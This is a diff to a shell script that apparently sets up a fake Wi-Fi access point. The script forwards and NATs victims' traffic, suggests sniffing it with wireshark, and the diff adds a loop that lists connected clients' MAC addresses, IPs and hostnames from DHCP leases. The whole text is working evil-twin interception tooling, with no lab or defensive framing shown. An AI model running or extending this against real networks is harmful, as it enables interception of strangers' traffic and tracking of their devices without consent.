@@ -88,23 +88,17 @@ echo "[*] Enabling IP forwarding..."
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
 echo "[*] Setting iptables rules..."
-iptables --flush
-iptables --table nat --flush
-iptables --delete-chain
-iptables --table nat --delete-chain
-
-iptables -P INPUT ACCEPT
-iptables -P FORWARD ACCEPT
-iptables -P OUTPUT ACCEPT
-
-iptables -I INPUT 1 -i "$AP_IFACE" -j ACCEPT
-iptables -I OUTPUT 1 -o "$AP_IFACE" -j ACCEPT
+iptables -F; iptables -t nat -F
+iptables -P INPUT ACCEPT; iptables -P FORWARD ACCEPT; iptables -P OUTPUT ACCEPT
+iptables -I INPUT -i "$AP_IFACE" -j ACCEPT
+iptables -I OUTPUT -o "$AP_IFACE" -j ACCEPT
 iptables -t nat -A POSTROUTING -o "$INTERNET_IFACE" -j MASQUERADE
-iptables -I FORWARD 1 -i "$AP_IFACE" -o "$INTERNET_IFACE" -j ACCEPT
-iptables -I FORWARD 2 -i "$INTERNET_IFACE" -o "$AP_IFACE" -m state --state ESTABLISHED,RELATED -j ACCEPT
+iptables -I FORWARD -i "$AP_IFACE" -o "$INTERNET_IFACE" -j ACCEPT
+iptables -I FORWARD -i "$INTERNET_IFACE" -o "$AP_IFACE" -m state --state ESTABLISHED,RELATED -j ACCEPT
 
 echo "[*] AP '$FAKE_SSID' running on $AP_IFACE. Sniff with: wireshark -i $AP_IFACE"
-echo "[*] DNS/DHCP log: journalctl -t dnsmasq -f"
+echo "[*] DNS/DHCP log:   journalctl -t dnsmasq -f"
+echo "[*] Watching connected clients (Ctrl+C to stop):"
 
 # === CLEANUP TRAP ===
 cleanup() {
@@ -123,8 +117,25 @@ cleanup() {
 }
 trap cleanup INT TERM
 
-# === KEEP SCRIPT ALIVE ===
-while kill -0 "$HOSTAPD_PID" 2>/dev/null; do sleep 2; done
+# === CLIENT WATCHER ===
+LEASES="/var/lib/misc/dnsmasq.leases"
+LAST=""
+while kill -0 "$HOSTAPD_PID" 2>/dev/null; do
+  CUR=$(iw dev "$AP_IFACE" station dump 2>/dev/null | awk '/Station/ {print $2}' | sort)
+  if [ "$CUR" != "$LAST" ]; then
+    LAST="$CUR"
+    echo "--- [$(date +%H:%M:%S)] connected clients ---"
+    if [ -z "$CUR" ]; then
+      echo "  (none)"
+    else
+      for mac in $CUR; do
+        info=$(awk -v m="$mac" 'tolower($2)==tolower(m) {printf "%-15s %s", $3, $4}' "$LEASES" 2>/dev/null)
+        echo "  $mac  ${info:-(no lease)}"
+      done
+    fi
+  fi
+  sleep 3
+done
 echo "[!] hostapd died. Log:"
 tail -30 /tmp/hostapd.log
 cleanup
